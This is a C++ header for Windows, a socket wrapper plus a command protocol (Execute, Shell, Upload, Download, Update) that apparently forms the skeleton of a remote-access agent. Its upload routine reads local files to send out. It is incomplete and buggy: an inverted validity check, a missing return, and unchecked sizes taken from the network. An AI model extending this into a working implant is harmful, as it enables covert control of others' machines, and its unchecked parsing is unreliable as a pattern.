# pragma once

# include <iostream>
# include <WinSock2.h>
# include <memory>
# include "../Plugin/Plugin.h"
# include "Filesystem.hpp"

# pragma comment(lib, "WS2_32.lib")

struct Socket {

	bool sockInvalid_{ true };
	bool isListener_{ false };
	SOCKET sockfd_{ SOCKET_ERROR };
	int addrFamily_{ -1 };
	int afType_{ -1 };
	int protocol_{ -1 };

	using Result = std::pair<bool, std::string>;


	explicit Socket(int addrFamily, int afType, int protocol, bool isListener)
		: isListener_(isListener),
		addrFamily_(addrFamily),
		afType_(afType),
		protocol_(protocol)
	{
		sockfd_ = socket(addrFamily, afType, protocol);
		if (sockfd_ != INVALID_SOCKET) {
			sockInvalid_ = false;
		}
	}

	~Socket() {
		if (valid())
			closesocket(sockfd_);
	}

	bool valid() const {
		return !sockInvalid_;
	}

	Result Bind(const std::string& ip, unsigned short port) const&& {
		if (!isListener_)
			return { false, "cannot bind to a client socket" };
		sockaddr_in addr;
		addr.sin_family = addrFamily_;
		addr.sin_addr.S_un.S_addr = inet_addr(ip.c_str());
		addr.sin_port = htons(port);
		return { bind(sockfd_, reinterpret_cast<sockaddr*>(&addr), sizeof(sockaddr_in)) != SOCKET_ERROR, "cannot bind to address " + ip };
	}

	Result Connect(const std::string& ip, unsigned short port) const {
		if (!isListener_)
			return { false, "cannot call connect() on a client socket" };
		sockaddr_in addr;
		addr.sin_family = addrFamily_;
		addr.sin_addr.S_un.S_addr = inet_addr(ip.c_str());
		addr.sin_port = htons(port);
		return { connect(sockfd_, reinterpret_cast<sockaddr*>(&addr), sizeof(sockaddr_in)) != SOCKET_ERROR, getError() };
	}

	Result Listen(int backlog) const&& {
		if (!isListener_)
			return { false, "Cannot listen on a client socket" };
		return { listen(sockfd_, backlog) != SOCKET_ERROR, getError() };
	}

	Result Send(const char* data, size_t size) {
		return { send(sockfd_, data, size, 0x0) != SOCKET_ERROR, getError() };
	}

	Result Recv(char* data, int& size) const {
		return { (size = recv(sockfd_, data, size, 0x0)) != SOCKET_ERROR, getError() };
	}

	operator bool() const {
		return sockfd_ == INVALID_SOCKET;
	}

private:
	std::string getError() const {

		DWORD errorMessageID = ::GetLastError();
		if (errorMessageID == 0) {
			return std::string();
		}
		LPSTR messageBuffer = nullptr;
		size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
		std::string message(messageBuffer, size);
		LocalFree(messageBuffer);

		return message;
	}

};

enum class ControlCode {
	Execute, Update,
	Log, Upload, Download,
	Shell, Nop, Error
};

struct Control {
	ControlCode code;
	int size;
	char data[1];
};

struct DownloadData {
	char filename[64];
	int size;
	bool mustBeEncrypted;
};

struct UploadData {
	int size;
	char filename[1];
};

struct Network {

	std::string address = "0.0.0.0";
	short port{3445};

	Control getControl(Socket &socket) {
		Control control;
		int size{ sizeof(Control) };
		socket.Recv(reinterpret_cast<char*>(&control), size);
		return control;
	}

	DownloadData &makeDownloadData(Control& control) {
		return *reinterpret_cast<DownloadData*>(control.data);
	}

	std::shared_ptr<char> download(Socket &socket, DownloadData &ddata) {
		char* mem = new char[ddata.size];
		socket.Recv(mem, ddata.size);
		return std::shared_ptr<char>{ mem };
	}

	FileStatus upload(Socket& socket, UploadData &upload) {
		auto&& result = Filesystem::readFile(std::string(upload.filename, upload.size));
		if (Error::isError(result))
			return Error::getError(result);
		auto&& value = Error::getValue(result);
	}
};